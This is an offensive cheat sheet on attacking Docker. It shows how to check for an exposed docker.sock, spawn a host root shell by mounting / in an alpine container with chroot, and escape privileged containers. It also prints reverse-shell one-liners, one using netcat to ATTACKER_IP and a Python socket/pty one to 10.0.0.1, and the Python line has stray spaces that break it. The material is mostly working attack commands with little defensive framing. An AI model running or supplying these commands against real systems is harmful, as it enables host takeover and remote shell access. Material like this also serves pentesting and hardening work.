## Exploiting an Exposed Docker Daemon (/var/run/docker.sock)
• The Docker daemon listens on /var/run/docker.sock, allowing full control over containers
• If exposed or mounted into a container, an attacker can execute arbitrary commands on the host

### Gain Root Access via Exposed docker.sock
• Check if the Docker socket is accessible
• Run the following command inside a compromised container or host
```
ls -lah /var/run/docker.sock
```
• If you get an output like this:
```
srw-rw---- 1 root docker 0 Mar 10 14:23 /var/run/docker.sock
```
• You can communicate with Docker!

### Spawn a root shell using the Docker socket
• If the docker.sock is accessible, spawn a new container with privileged access
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
• This will mount the entire host filesystem inside the container and give you root access to the host

## Exploiting Misconfigured Dockerfiles
• Many Docker images run applications as root, making them easy to exploit
• Containers run as root by default if not explicitly changed
• Can lead to container escapes and privilege escalation
• Can even leak Dockerfiles containing Sensitive information

• Possible to gain Reverse Shell using multiple tools like
	• Netcat
	• Bash
	• Or languages like, python, node, php, etc
• Run a reverse shell to an attacker:
```
nc -e /bin/sh ATTACKER_IP 4444
```
• Or using below python One Liner
```
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_I NET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os. dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Docker Escape and Privilege Escalation
• Privileged containers have unrestricted access to the host.
• Attackers can modify system files, escalate privileges, and escape.
```
docker run --rm -it --privileged -v /:/mnt -p 3000:3000 vulnerable-image
```

